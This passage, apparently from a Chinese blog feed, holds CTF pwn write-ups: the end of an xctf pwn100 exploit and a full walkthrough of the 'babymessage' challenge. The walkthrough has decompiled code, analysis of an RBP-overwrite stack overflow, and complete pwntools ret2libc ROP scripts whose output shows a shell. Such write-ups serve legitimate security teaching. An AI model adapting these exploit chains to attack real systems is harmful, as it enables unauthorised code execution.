punctuation">(</span>puts_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'bye~\n'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#puts_addr = u64(sh.recv(6)+'\x00'*2)</span>st_r <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">//</span>去除后面的\n<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>st_r<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token operator">//</span>填满八个字节    st_r <span class="token operator">+=</span> <span class="token string">'\x00'</span><span class="token comment" spellcheck="true">#libc_start_main_addr = u64(sh.recv(6)+'\x00'*2)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>st_r<span class="token punctuation">)</span><span class="token keyword">print</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x40</span>payload1 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">7</span>   <span class="token operator">//</span>本来放<span class="token number">8</span>个A填充RBP但是不知到为啥会占用下面地址的内存，从而无法实现跳转，大佬请留言payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  <span class="token operator">//</span>binsh真实地址payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token operator">//</span>system真实地址payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>  payload1 <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x4</span> bytes<span class="token operator">:</span>    <span class="token string">'bye~'</span>bye<span class="token operator">~</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x1a</span> bytes<span class="token operator">:</span>    <span class="token string">'\n'</span>    <span class="token string">'/bin/sh: 1: B: not found\n'</span><span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token operator">:</span> <span class="token number">1</span><span class="token operator">:</span> B<span class="token operator">:</span> not found$ ls<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x3</span> bytes<span class="token operator">:</span>    <span class="token string">'ls\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x24</span> bytes<span class="token operator">:</span>    <span class="token string">'bin\n'</span>    <span class="token string">'dev\n'</span>    <span class="token string">'flag\n'</span>    <span class="token string">'lib\n'</span>    <span class="token string">'lib32\n'</span>    <span class="token string">'lib64\n'</span>    <span class="token string">'pwn100\n'</span>bindevflagliblib32lib64pwn100</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8月国赛-babymessage--one_gadget</title>
      <link href="/2020/09/01/8-yue-guo-sai-babymessage-one-gadget/"/>
      <url>/2020/09/01/8-yue-guo-sai-babymessage-one-gadget/</url>
      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ checksec babymessage<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/\xe5\x9b\xbd\xe8\xb5\x9b/babymessage'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x3fe000</span><span class="token punctuation">)</span>基本操作</code></pre><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c">main函数：<span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                       <span class="token comment" spellcheck="true">// 菜单输出</span>  <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>work函数：__int64 <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  bss_mess <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> bss_mm <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bss_mm<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> bss_mm <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token function">leave_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">// 最多读入4个字节</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> bss_mm <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">256</span> <span class="token punctuation">)</span>          v1 <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span>        <span class="token function">leave_message</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment" spellcheck="true">// 读入信息到bss_buf</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> bss_mm <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">show</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> bss_mm <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span>leave_name函数：__int64 <span class="token function">leave_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  bss_name<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> bss_name<span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//read函数读入4个字节到bss_name段，返回值为5   bss_name[5] = 0相当于加了个边界</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span>leave_message函数：__int64 __fastcall <span class="token function">leave_message</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST14_4</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"message: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//存在微小溢出</span>  <span class="token function">strncpy</span><span class="token punctuation">(</span>bss_mess<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  bss_mess<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//加边界截至符</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span>show函数：__int64 __fastcall <span class="token function">show</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s says: "</span><span class="token punctuation">,</span> bss_name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> bss_mess<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>全局变量很多此处列出主要全局变量位置关系：</strong></p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010C0 bss_mm          dd <span class="token operator">?</span>                    <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> work<span class="token operator">+</span><span class="token number">19</span>↑r<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010C0                                         <span class="token punctuation">;</span> work<span class="token operator">+</span><span class="token number">31</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010C4                 align <span class="token number">8</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010C8 <span class="token punctuation">;</span> <span class="token keyword">char</span> <span class="token operator">*</span>bss_mess<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010C8 bss_mess        dq <span class="token operator">?</span>                    <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> leave_message<span class="token operator">+</span><span class="token number">3F</span>↑r<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010C8                                         <span class="token punctuation">;</span> leave_message<span class="token operator">+</span><span class="token number">59</span>↑r <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010D0 <span class="token punctuation">;</span> _BYTE bss_name<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010D0 bss_name        db 10h <span class="token function">dup</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span>           <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> leave_name<span class="token operator">+</span><span class="token number">15</span>↑o<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010D0                                         <span class="token punctuation">;</span> leave_name<span class="token operator">+</span>2E↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010D0 _bss            ends<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000006010D0</code></pre><p>差不多都是8个字节大小</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>IDA字符串表中没有system，/bin/sh，更没有后门函数。题目给出libc文件，应该是要ret2libc</li><li>整个程序看起来很漂亮，但是有两个刺眼的地方<ul><li>work函数中if ( v1 &gt; 256 ） v1 = 256;这句话很完全没必要存在，加上下面：leave_message(v1);这个函数，如果v1成功等于256那么leave_message(v1)函数就存在很大的溢出量了</li><li>leave_message(v1)函数中读入的字符数量用来覆盖RBP没问题</li></ul></li><li>引入时钟大佬模块(doge)</li><li>在IDA汇编代码进入work函数中的if ( v1 &gt; 256 )判断，发现：<pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>text<span class="token operator">:</span>000000000040091A var_4           <span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">4</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>text<span class="token operator">:</span>000000000040097A                 mov     eax<span class="token punctuation">,</span> cs<span class="token operator">:</span>bss_mm<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000400980</span>                 cmp     eax<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000400983</span>                 jnz     <span class="token keyword">short</span> loc_4009A1<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000400985</span>                 cmp     <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">,</span> 100h   <span class="token comment" spellcheck="true">//**************************</span><span class="token punctuation">.</span>text<span class="token operator">:</span>000000000040098C                 jle     <span class="token keyword">short</span> leav_message<span class="token punctuation">.</span>text<span class="token operator">:</span>000000000040098E                 mov     <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">,</span> 100h</code></pre>var_4 = -4  在cmp时 就是利用RBP-4处地址的值来和0x100执行 ，结合f5伪代码，此处地址的值大于0x100那么==&gt;v1 == 0x100 ,那么leave_message函数能过实现可控溢出</li><li>而我们在执行leave_messsage模块时可以控制RBP，然后返回到work函数，也是说在leave_messsage中覆盖了RBP也就时覆盖了work函数中的RBP。</li><li>再进一步：cmp     [rbp+var_4], 100h 时比较对象[rbp+var_4]是可控的</li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>第一次执行leave_messsage时构造payload使得RBP指向一个可控的位置，恰好这里使用的关键变量都是全局变量在bss段</li><li>在该可控位置输入字符串，这样其在bss中的二进制数可以大于256</li><li>再次执行leave_messsage函数<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">256</span> <span class="token punctuation">)</span>        v1 <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span>这个判断就会成立，进入下面的语句使得v1<span class="token operator">==</span><span class="token number">256</span></code></pre></li><li>构造payload 泄露某函数真实地址</li><li>获取licb地址，system，/bin/sh地址，设置返回地址为start，准备get_shell</li><li>故技重施让v1==256</li><li>执行leave_messsage函数，构造payload获取shell</li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>libc_0 <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27.so'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babymessage'</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>start <span class="token operator">=</span> <span class="token number">0x0000000004006E0</span> pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400ac3</span><span class="token comment" spellcheck="true">#one_gadget_off = 0x4f3c2</span>one_gadget_off_0 <span class="token operator">=</span> <span class="token number">0x10a45c</span>one_gadget_off <span class="token operator">=</span> <span class="token number">0x4f3c2</span>ret <span class="token operator">=</span> <span class="token number">0x0000000000400646</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">name</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name: '</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">message</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babymessage'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print sh.recv()</span>name<span class="token punctuation">(</span><span class="token string">'cccc'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">8</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000006010D0</span><span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">)</span>  <span class="token operator">//</span>message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'done!\n\n'</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>libc_addr_0 <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc_0<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>one_gadget_addr <span class="token operator">=</span>libc_addr_0 <span class="token operator">+</span>  one_gadget_off_0 <span class="token keyword">print</span> <span class="token string">"one_gadget_addr==>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr==>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print sh.recv()</span>name<span class="token punctuation">(</span><span class="token string">'cccc'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">8</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000006010D0</span><span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">)</span>message<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print sh.recv()</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>message<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print sh.recv()</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>payload += p64(0x0000000006010D0+0x4)这里加4然后到那个if判断时会减4 ：cmp     [rbp+var_4], 100h。这样0x0000000006010D0地址处的值就是我们的操作数，这里就是bss_name地址。<br>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x11</span> bytes<span class="token operator">:</span>    <span class="token string">'message: \n'</span>    <span class="token string">'done!\n'</span>    <span class="token string">'\n'</span>message<span class="token operator">:</span> done<span class="token operator">!</span>$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP~~"></a>EXP~~</h3><ul><li>针对模块式程序，我们写EXP也最好写对应的自定义函数来调用</li><li>面对有很多输出语句的程序别对sh.recv()太执着，context.log_level = ‘debug’可以帮忙解决（因为这个我的EXP，失败了很多次）</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个题的关键就在于如何使得leave_message函数变成高危栈溢出漏洞函数，主要利用了子函数的小漏洞（此处子函数存在对RBP的修改漏洞）返回后对上级函数的影响（此处为RBP保持不变）</p><ul><li>所以当没有思路时可以在汇编层思考</li><li>上级函数与子函数之间某些寄存器的关联（常见的就是RBP/EBP） </li></ul><h2 id="one-gadget工具"><a href="#one-gadget工具" class="headerlink" title="one_gadget工具"></a>one_gadget工具</h2><p>libc中带有很多gadget，控制程序跳转到这些位置执行并满足一定的条件就可以拿到shell。</p><h3 id="万能one-gadget"><a href="#万能one-gadget" class="headerlink" title="万能one_gadget"></a>万能one_gadget</h3><p>指令：one_gadget libc文件</p><pre class=" language-c"><code class="language-c">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>国赛$ one_gadget libc<span 